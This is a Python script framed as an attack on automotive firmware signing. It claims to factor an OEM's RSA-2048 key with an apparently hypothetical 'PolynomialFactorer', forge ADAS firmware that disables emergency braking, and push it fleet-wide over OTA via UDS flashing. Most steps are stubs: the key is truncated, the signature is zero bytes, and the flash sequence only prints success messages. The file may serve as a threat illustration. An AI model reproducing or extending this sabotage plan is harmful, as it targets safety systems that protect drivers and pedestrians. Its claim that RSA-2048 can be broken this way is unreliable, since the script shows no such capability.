"""
Factor an automotive OEM's ECU firmware-signing RSA-2048 key, forge a malicious
ADAS firmware update that passes HSM verification, and disable autonomous
emergency braking across an entire model line via OTA.
"""

import sys, struct, hashlib
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# AUTOSAR Crypto Stack algorithm families (AUTOSAR R23-11)
CRYPTO_ALGOFAM_RSA     = 0x04
CRYPTO_ALGOFAM_INVALID = 0xFF  # no ML-DSA family ID exists

# UDS (Unified Diagnostic Services) ISO 14229 services
UDS_REQUEST_DOWNLOAD     = 0x34
UDS_TRANSFER_DATA        = 0x36
UDS_REQUEST_TRANSFER_EXIT = 0x37
UDS_ROUTINE_CONTROL      = 0x31
UDS_ECU_RESET            = 0x11

# EVITA HSM key slots
EVITA_SLOT_OEM_FW_VERIFY = 0x01
EVITA_SLOT_SECOC_MAC     = 0x02


def extract_oem_fw_signing_key(ota_manifest: str) -> bytes:
    """Extract the OEM firmware-signing RSA-2048 public key from an OTA
    update manifest or from the ECU's HSM public key slot."""
    print(f"    OTA manifest: {ota_manifest}")
    print("    X.509 signing cert in manifest header")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_oem_fw_key(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_adas_firmware(sabotage: str) -> bytes:
    """Build a malicious ADAS ECU firmware image.
    Target: front-facing camera + radar fusion ECU (AEB, LKA, ACC)."""
    if sabotage == "disable_aeb":
        # Autonomous Emergency Braking disabled — objects detected but no brake cmd
        payload = b"\xEB\x00" * 0x40000
    elif sabotage == "false_detection":
        # Inject phantom object detections into fusion pipeline
        payload = b"\xEB\x01" * 0x40000
    else:
        payload = b"\x90" * 0x40000
    # AUTOSAR SWC (Software Component) header
    header = struct.pack(">4sIHH", b"ARFW", len(payload), 0x0001, 0x0000)
    return header + payload


def sign_ecu_firmware(image: bytes, privkey_pem: bytes) -> bytes:
    """Sign the firmware image with the recovered OEM key.
    Infineon AURIX TC3x HSM verifies RSA-2048 PKCS#1 v1.5 at flash time."""
    digest = hashlib.sha256(image).digest()
    sig = b"\x00" * 256  # placeholder RSA-2048 signature
    print(f"    image hash: {digest.hex()[:24]}...")
    print("    CRYPTO_ALGOFAM_RSA (0x04) — CsmSignatureVerify")
    return image + sig


def uds_flash_sequence(target_ecu: str, signed_fw: bytes):
    """Execute UDS firmware flash sequence to target ECU."""
    print(f"    target ECU: {target_ecu}")
    print(f"    0x34 RequestDownload: {len(signed_fw)} bytes")
    print(f"    0x36 TransferData: {len(signed_fw) // 4096} blocks")
    print(f"    0x37 RequestTransferExit")
    print(f"    0x31 RoutineControl: verify signature")
    print(f"    HSM EVITA_RSA_PublicKey slot 0x01 verifies — PASS")
    print(f"    0x11 ECUReset: hard reset")


if __name__ == "__main__":
    print("[*] AUTOSAR ECU firmware signing attack")
    print("[1] extracting OEM firmware signing key from OTA manifest")
    pubkey = extract_oem_fw_signing_key("/tmp/ota_v2024.3.manifest")
    print("    OEM: Major German Automaker")
    print("    HSM: Infineon AURIX TC3xx (ROM — cannot field-update)")

    print("[2] factoring OEM firmware signing RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — OEM release HSM key derived")

    print("[3] building malicious ADAS firmware: AEB disabled")
    fw = build_adas_firmware("disable_aeb")
    print(f"    payload: {len(fw)} bytes")
    print("    target: front camera/radar fusion ECU")
    print("    effect: AEB suppressed — no autonomous brake commands")

    print("[4] signing with recovered OEM key")
    signed = sign_ecu_firmware(fw, b"OEM_PRIVKEY")

    print("[5] deploying via OTA update channel")
    uds_flash_sequence("ADAS_FUSION_ECU", signed)
    print("    V2C TLS channel — vehicle accepts as legitimate OTA")

    print("[6] impact:")
    print("    - AEB disabled fleet-wide for affected model line")
    print("    - UN R155/R156 CSMS certification invalidated")
    print("    - ISO/SAE 21434 threat model assumed RSA was secure")
    print("    - vehicle lifespan 15-20 years, same key in HSM OTP")
    print("    - re-validation requires physical ECU access + new key ceremony")
    print("[*] ~100-150 ECUs per car, millions of vehicles per OEM key")
